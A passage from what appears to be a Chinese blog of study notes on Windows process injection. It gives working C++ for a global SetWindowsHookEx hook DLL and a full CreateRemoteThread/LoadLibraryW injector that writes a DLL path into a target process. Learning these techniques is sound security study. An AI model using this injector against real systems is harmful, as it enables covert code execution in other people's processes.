class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> HMODULE g_hDllModule;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共享内存</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ::<span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == g_hHook) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里第二个参数是回调函数，那么我们还需要写一个回调函数的实现，这里就需要用到CallNextHookEx这个api，主要是第一个参数，这里传入钩子的句柄的话，就会把当前钩子传递给下一个钩子，若参数传入0则对钩子进行拦截</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//UnhookWindowsHookEx这个api是来卸载钩子的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/24/wCYX4H8ZlFsjRLn.png" alt="image-20220224222240772"></p><p>在<code>dllmain.cpp</code>设置<code>DLL_PROCESS_ATTACH</code>，然后编译生成<code>Dll1.dll</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line">HMODULE g_hDllModule = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">g_hDllModule = hModule;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/24/VaoDcTw6Mk9gtqr.png" alt="image-20220224222424391"></p><p>之后再创建一个控制台项目</p><p><img src="https://s2.loli.net/2022/02/24/QRdjGtNJlrzC4cL.png" alt="image-20220224222618491"></p><p>用<code>LoadLibrabryW</code>加载dll，生成<code>inject2.cpp</code>文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inject2.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">hDll = ::<span class="built_in">LoadLibraryW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;D:\\vs2017project\\Dll1\\Debug\\Dll1.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SetGlobalHook = (typedef_SetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;SetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == SetGlobalHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bRet = <span class="built_in">SetGlobalHook</span>();</span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook ERROR.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">UnsetGlobalHook = (typedef_UnsetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;UnsetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == UnsetGlobalHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">UnsetGlobalHook</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook OK.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="执行测试"><a href="#执行测试" class="headerlink" title="执行测试"></a>执行测试</h2><p>编译inject2.cpp生成inject2.exe并运行</p><p><img src="https://s2.loli.net/2022/02/24/GxqaEHvXl4o2Whp.png" alt="image-20220224223314059"></p><p>打开进程工具，搜索Dll1.dll是否加载，发现在大多数进程中都得到了加载</p><p><img src="https://s2.loli.net/2022/02/24/dI9iPKgc2f6zMEm.png" alt="image-20220224223458548"></p><p>尝试卸载钩子</p><p><img src="https://s2.loli.net/2022/02/24/Nm15PFzj6fyGsxl.png" alt="image-20220224223607471"></p><p>进程中的Dll1.dll已经被卸载</p><p><img src="https://s2.loli.net/2022/02/24/AE3vKXiQVJDThYH.png" alt="image-20220224223746445"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程注入系列一之CreateRemoteThread()</title>
      <link href="/post/f3914fba.html"/>
      <url>/post/f3914fba.html</url>
      
        <content type="html"><![CDATA[<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>原理是将恶意的动态链接库路径写入到另一个进程的虚拟空间内，通过在目标进程中创建远程线程进行加载。<br><img src="https://s2.loli.net/2022/02/23/AQUJbgBVqyNT4D6.jpg" alt="t0117bd3187269363f4" style="zoom: 67%;" /><br>但是程序不会无故加载我们恶意的dll，所以我们就要使用<code>Windows API</code>了，它提供了大量的函数来附加和操纵其他进程。<br>API中的所有函数都包含于DLL文件之中。其中，最重要的是<code>Kernel32.dll</code>（包含管理内存，进程和线程相关的函数），<code>User32.dll</code>（大部分是用户接口函数），和“GDI32.dll”（绘制图形和显示文本相关的函数）等。</p><h2 id="注入代码的实现"><a href="#注入代码的实现" class="headerlink" title="注入代码的实现"></a>注入代码的实现</h2><p>由于基本上大多数进程都会使用<code>Kernel32.dll</code>，核心思想就是在目标进程中开启一个线程调用<code>LoadLibrary</code>函数来加载我们想要注入的dll<br>大致注入流程如下图<br><img src="https://s2.loli.net/2022/02/23/Uhm8WlzwyNirHoE.jpg" alt="QQ截图20220223204205" style="zoom:80%;" /></p><h3 id="使用到的一些函数"><a href="#使用到的一些函数" class="headerlink" title="使用到的一些函数"></a>使用到的一些函数</h3><p><code>OpenProcess</code>函数<br><code>OpenProcess</code>函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD dwDesiredAccess, <span class="comment">//想拥有的该进程访问权限</span></span></span></span><br><span class="line"><span class="params"><span class="function"> BOOL bInheritHandle, <span class="comment">// 是否继承句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD dwProcessId<span class="comment">// 被打开进程的PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">       )</span></span>;</span><br></pre></td></tr></table></figure><p>参数解释：<br>a.dwDesiredAccess：想拥有的该进程访问权限<br>PROCESS_ALL_ACCESS //所有能获得的权限<br>PROCESS_CREATE_PROCESS //需要创建一个进程<br>PROCESS_CREATE_THREAD  //需要创建一个线程<br>PROCESS_DUP_HANDLE   //重复使用DuplicateHandle句柄<br>PROCESS_QUERY_INFORMATION  //获得进程信息的权限，如它的退出代码、优先级<br>PROCESS_QUERY_LIMITED_INFORMATION （获得某些信息的权限，如果获得了PROCESS_QUERY_INFORMATION，也拥有PROCESS_QUERY_LIMITED_INFORMATION权限）<br>PROCESS_SET_INFORMATION  //设置某些信息的权限，如进程优先级<br>PROCESS_SET_QUOTA     //设置内存限制的权限，使用SetProcessWorkingSetSize<br>PROCESS_SUSPEND_RESUME   //暂停或恢复进程的权限<br>PROCESS_TERMINATE     //终止一个进程的权限，使用TerminateProcess<br>PROCESS_VM_OPERATION    //操作进程内存空间的权限(可用VirtualProtectEx和WriteProcessMemory)<br>PROCESS_VM_READ      //读取进程内存空间的权限，可使用ReadProcessMemory<br>PROCESS_VM_WRITE      //读取进程内存空间的权限，可使用WriteProcessMemory<br>SYNCHRONIZE        //等待进程终止<br>b.bInheritHandle：表示所得到的进程句柄是否可以被继承<br>c.dwProcessId：被打开进程的PID</p><p>返回值：<br>如成功，返回值为指定进程的句柄。<br>如失败，返回值为<code>NULL</code>，可调用<code>GetLastError()</code>获得错误代码。</p><p><code>VirtualAllocEx</code>函数<br>获得返回句柄之后再用<code>VirtualAllocEx</code>函数，在目标进程中开辟一块内存存放我们的dll的路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess, <span class="comment">// 申请内存所在的进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress, <span class="comment">// 保留页面的内存地址；一般用NULL自动分配</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize, <span class="comment">// 欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍</span></span></span></span><br><span class="line"><span class="params"><span class="function">DWORD flAllocationType, <span class="comment">//为特定的页面区域分配内存中或磁盘</span></span></span></span><br><span class="line"><span class="params"><span class="function">DWORD flProtect <span class="comment">//受保护状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure><p><code>WriteProcessMemory</code>函数<br>之后使用<code>WriteProcessMemory</code>函数向目标内存写入dll地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  HANDLE  hProcess, <span class="comment">//由OpenProcess返回的进程句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  LPVOID  lpBaseAddress, <span class="comment">//要写的内存首地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  LPCVOID lpBuffer, <span class="comment">//指向要写的数据的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_  SIZE_T  nSize, <span class="comment">//要写入的字节数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_ SIZE_T  *lpNumberOfBytesWritten <span class="comment">//返回值。返回实际写入的字节</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>用<code>GetProcAddress</code>函数获得<code>LoadLibraryW</code>函数的起始地址。<code>LoadLibraryW</code>函数位于<code>Kernel32.dll</code>中，再用<code>CreateRemoteThread</code>函数让目标进程执行<code>LoadLibraryW</code>来加载被注入的dll。函数结束将返回载入dll后的模块句柄。<br>注意：这里的<code>LoadLibrary</code>函数在底层实际调用有两种可能，如果目标程序使用的是<code>ANSI</code>编码方式，<code>LoadLibrary</code>实际调用的是<code>LoadLibraryA</code>，其参数字符串应当是<code>ANSI</code>编码；<br>如果目标程序使用的是<code>Unicode</code>编码方式，<code>LoadLibrary</code>实际调用的是<code>LoadLibraryW</code>，其参数字符串应当是<code>Unicode</code>编码。</p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(DWORD dwId, WCHAR* szPath)</span></span></span><br><span class="line"><span class="function"><span class="comment">//参数1：目标进程id； 参数2：DLL路径</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.在目标进程中申请一个空间</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.1获取目标进程句柄</span></span><br><span class="line"><span class="comment">参数1：想要拥有的进程权限</span></span><br><span class="line"><span class="comment">参数2：表示所得到的进程句柄是否可以被继承</span></span><br><span class="line"><span class="comment">参数3：被打开进进程的pid</span></span><br><span class="line"><span class="comment">返回值：指定进程的句柄</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwId);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.2在目标进程中开辟空间</span></span><br><span class="line"><span class="comment">参数1：目标进程句柄</span></span><br><span class="line"><span class="comment">参数2：保留页面的内存地址，一般用NULL自动分配</span></span><br><span class="line"><span class="comment">参数3：想要分配的内存大小，字节为单位</span></span><br><span class="line"><span class="comment">参数4：ME_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储</span></span><br><span class="line"><span class="comment">参数5：PAGE_READWRITE：区域可被应用程序读写</span></span><br><span class="line"><span class="comment">返回值：执行成功就返回分配内存的首地址，不成功就是NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID pRemoteAdress = <span class="built_in">VirtualAllocEx</span>(</span><br><span class="line">hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">wcslen</span>(szPath) * <span class="number">2</span>,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE</span><br><span class="line">);</span><br><span class="line"><span class="comment">//2.把dll的路径写入到目标进程的内存空间中</span></span><br><span class="line">DWORD dwWriteSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">写一段数据到刚才给指定进程所开辟的内存空间里</span></span><br><span class="line"><span class="comment">参数1：OpenProcess返回的进程句柄</span></span><br><span class="line"><span class="comment">参数2：准备写入的内存地址</span></span><br><span class="line"><span class="comment">参数3：指向要写入的数据指针（准备写入的东西）</span></span><br><span class="line"><span class="comment">参数4：要写的字节数（东西的长度+0/）</span></span><br><span class="line"><span class="comment">参数5：返回值，返回实际写入的字节</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">BOOL bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteAdress, szPath, <span class="built_in">wcslen</span>(szPath) * <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3.创建一个远程线程，让目标进程调用LoadLibrary</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数1：该远程线程所属进程的进程句柄</span></span><br><span class="line"><span class="comment">参数2：一个指向SECURITY_ATTRIBUTES结构的指针，该结构指定了线程的安全属性</span></span><br><span class="line"><span class="comment">参数3：线程栈初始大小，以字节为单位，若该值设为0，那么使用系统默认大小</span></span><br><span class="line"><span class="comment">参数4：在远程进程的地址空间中，该线程的线程函数的起始地址（也就是这个线程具体干的活）</span></span><br><span class="line"><span class="comment">参数5：传给线程函数的参数（刚才在内存里开辟的空间里写入的东西）</span></span><br><span class="line"><span class="comment">参数6：控制线程创建的标志。0（NULL）表示该线程在创建后立即运行</span></span><br><span class="line"><span class="comment">参数7：指向接收线程标识符的变量的指针。如果为NULL，则不返回线程标识符</span></span><br><span class="line"><span class="comment">返回值；如果函数成功，则返回值是新线程的句柄。如果函数失败，则返回值为NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取模块地址</span></span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!hModule)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetModuleHandle Error !\n&quot;</span>);</span><br><span class="line"><span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取LoadLibraryA函数地址</span></span><br><span class="line">LPTHREAD_START_ROUTINE dwLoadAddr = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!dwLoadAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error !\n&quot;</span>);</span><br><span class="line"><span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建远程线程，加载dll</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)dwLoadAddr,</span><br><span class="line">pRemoteAdress,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//WaitForSingleObject(hThread, -1);当句柄所指的线程右信号的时候才会返回</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">4.释放申请的虚拟内存空间</span></span><br><span class="line"><span class="comment">参数1：目标进程的句柄。该句柄必须拥有PROCESS_VM-OPERATION权限</span></span><br><span class="line"><span class="comment">参数2：指向要释放的虚拟内存空间首地址的指针</span></span><br><span class="line"><span class="comment">参数3：虚拟内存空间的字节数</span></span><br><span class="line"><span class="comment">参数4：MEM_DECOMMIT仅表示内存空间不可用，内存页还将存在</span></span><br><span class="line"><span class="comment">MEM_RELEASE这种方式很彻底，完全回收。</span></span><br><span class="line"><span class="comment">VirtualFreeEx(hProcess, pRemoteAddress, 1, MEM_DECOMMIT);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(WCHAR* szName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hprocessSnap = <span class="literal">NULL</span>;</span><br><span class="line">PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">hprocessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/*if (hprocessSnap == (HANDLE)-1) &#123; return 0; &#125;*/</span></span><br><span class="line">pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hprocessSnap, &amp;pe32))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(szName, pe32.szExeFile))</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)pe32.th32ProcessID;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hprocessSnap, &amp;pe32));</span><br><span 